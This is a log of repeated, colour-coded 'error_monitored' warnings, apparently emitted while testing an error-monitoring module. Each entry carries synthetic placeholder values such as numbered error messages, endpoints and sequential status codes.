WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695282Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 218'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695331Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 219'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695380Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 220'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695428Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 221'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695476Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 222'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695524Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 223'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695572Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 224'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695621Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 225'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695668Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 226'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695715Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 227'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695764Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 228'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695813Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 229'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695861Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 230'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.695909Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 231'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696011Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 232'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696077Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 233'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696131Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 234'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696183Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 235'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696232Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 236'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696283Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 237'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696334Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 238'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696383Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 239'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696432Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 240'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696482Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 241'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696537Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 242'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696589Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 243'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696639Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 244'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696689Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 245'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696738Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 246'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696786Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 247'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696835Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 248'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696883Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m5[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 249'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696931Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 250'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.696979Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 251'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697027Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 252'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697075Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 253'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 254'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697170Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 255'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697218Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 256'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.697266Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m6[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 257'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
